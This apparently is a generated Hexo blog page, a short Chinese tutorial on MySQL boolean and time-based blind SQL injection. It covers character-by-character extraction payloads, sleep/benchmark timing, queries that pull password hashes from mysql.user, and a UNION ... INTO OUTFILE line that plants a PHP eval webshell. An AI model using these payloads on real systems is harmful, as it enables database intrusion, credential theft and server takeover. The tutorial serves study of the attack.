@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="常用函数123456789101112131415select ascii (&quot;  &quot;);  转换成ASCII码select char(  );  ASCII转换回来select mid(&apos;hello&apos;,2,3); 从谁开始截取几位select substr(&apos;hello&apos;,2,3);从谁开始截取几位select length(&apos;hello&apos;);计算字符串的长度select count(*) fr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="布尔盲注与时间延迟盲注">
+<meta property="og:url" content="http://yoursite.com/2019/08/31/布尔盲注/index.html">
+<meta property="og:site_name" content="D-yu">
+<meta property="og:description" content="常用函数123456789101112131415select ascii (&quot;  &quot;);  转换成ASCII码select char(  );  ASCII转换回来select mid(&apos;hello&apos;,2,3); 从谁开始截取几位select substr(&apos;hello&apos;,2,3);从谁开始截取几位select length(&apos;hello&apos;);计算字符串的长度select count(*) fr">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-31T10:48:40.534Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="布尔盲注与时间延迟盲注">
+<meta name="twitter:description" content="常用函数123456789101112131415select ascii (&quot;  &quot;);  转换成ASCII码select char(  );  ASCII转换回来select mid(&apos;hello&apos;,2,3); 从谁开始截取几位select substr(&apos;hello&apos;,2,3);从谁开始截取几位select length(&apos;hello&apos;);计算字符串的长度select count(*) fr">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>布尔盲注与时间延迟盲注</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/08/29/SQL报错注入/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/31/布尔盲注/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/31/布尔盲注/&text=布尔盲注与时间延迟盲注"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/31/布尔盲注/&is_video=false&description=布尔盲注与时间延迟盲注"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=布尔盲注与时间延迟盲注&body=Check out this article: http://yoursite.com/2019/08/31/布尔盲注/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/31/布尔盲注/&name=布尔盲注与时间延迟盲注&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数"><span class="toc-number">1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试布尔盲注"><span class="toc-number">2.</span> <span class="toc-text">测试布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间的延迟盲注"><span class="toc-number">3.</span> <span class="toc-text">基于时间的延迟盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用的函数"><span class="toc-number">4.</span> <span class="toc-text">常用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何在SQL注入中写webshell"><span class="toc-number">5.</span> <span class="toc-text">如何在SQL注入中写webshell</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        布尔盲注与时间延迟盲注
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">D-yu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-08-31T10:48:49.074Z" itemprop="datePublished">2019-08-31</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">select ascii (<span class="string">"  "</span>);  转换成ASCII码</span><br><span class="line">select char(  );  ASCII转换回来</span><br><span class="line"></span><br><span class="line">select mid(<span class="string">'hello'</span>,2,3); 从谁开始截取几位</span><br><span class="line">select substr(<span class="string">'hello'</span>,2,3);从谁开始截取几位</span><br><span class="line"></span><br><span class="line">select length(<span class="string">'hello'</span>);计算字符串的长度</span><br><span class="line"></span><br><span class="line">select count(*) from mysql.user;  计算查询结果有几行</span><br><span class="line"></span><br><span class="line">select concat(host,user,password) from mysql.user;</span><br><span class="line">连接行数数据，有几行显示几行</span><br><span class="line"></span><br><span class="line">select group_concat(host,user,password) from mysql.user;</span><br><span class="line">连接数据，全部合并为一行</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试布尔盲注"><a href="#测试布尔盲注" class="headerlink" title="测试布尔盲注"></a>测试布尔盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">首先计算长度</span><br><span class="line">length (user()) &gt; 10</span><br><span class="line"></span><br><span class="line">二分法</span><br><span class="line"></span><br><span class="line">判断第一个字母</span><br><span class="line"></span><br><span class="line">    ASCII计算</span><br><span class="line"></span><br><span class="line">    取第一个字母</span><br><span class="line">    and ascii(mid((select group_concat(schema_name) from information_schema.schemata),1,1)) &gt;50</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间的延迟盲注"><a href="#基于时间的延迟盲注" class="headerlink" title="基于时间的延迟盲注"></a>基于时间的延迟盲注</h3><h3 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5);停止五秒</span><br><span class="line"></span><br><span class="line">select benchmark(10000000,md5(1));根据你指定的次数运行某一个函数</span><br><span class="line"></span><br><span class="line">select <span class="keyword">if</span> (1=1, 1, 0); 条件为真的话执行第二个参数，为假的话执行第三个参数</span><br><span class="line"></span><br><span class="line">select <span class="keyword">case</span> 1=1 when 1 <span class="keyword">then</span> 123 <span class="keyword">else</span> 456 end;</span><br><span class="line"></span><br><span class="line">select <span class="keyword">case</span> length(version()) when 14 <span class="keyword">then</span> 123 <span class="keyword">else</span> 456 end;</span><br></pre></td></tr></table></figure>
+
+<p>and 先执行左边 ，左边如果为假，右边不执行<br>or 先执行右边 ，右边如果为假，左边不执行<br>知道真假，判断使用and或or!为空就是假<br>在mysql中，or两边都会执行，数据中所有行全部乘以sleep时间执行。</p>
+<h3 id="如何在SQL注入中写webshell"><a href="#如何在SQL注入中写webshell" class="headerlink" title="如何在SQL注入中写webshell"></a>如何在SQL注入中写webshell</h3><p>前提有写权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,(select<span class="string">'&lt;?php @eval($_POST['</span>pass<span class="string">']); ?&gt;'</span> into outfile <span class="string">'/var/wwww/html/1.php'</span>)--+</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数"><span class="toc-number">1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试布尔盲注"><span class="toc-number">2.</span> <span class="toc-text">测试布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间的延迟盲注"><span class="toc-number">3.</span> <span class="toc-text">基于时间的延迟盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用的函数"><span class="toc-number">4.</span> <span class="toc-text">常用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何在SQL注入中写webshell"><span class="toc-number">5.</span> <span class="toc-text">如何在SQL注入中写webshell</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/31/布尔盲注/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/31/布尔盲注/&text=布尔盲注与时间延迟盲注"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/31/布尔盲注/&is_video=false&description=布尔盲注与时间延迟盲注"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=布尔盲注与时间延迟盲注&body=Check out this article: http://yoursite.com/2019/08/31/布尔盲注/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/31/布尔盲注/&title=布尔盲注与时间延迟盲注"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/31/布尔盲注/&name=布尔盲注与时间延迟盲注&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
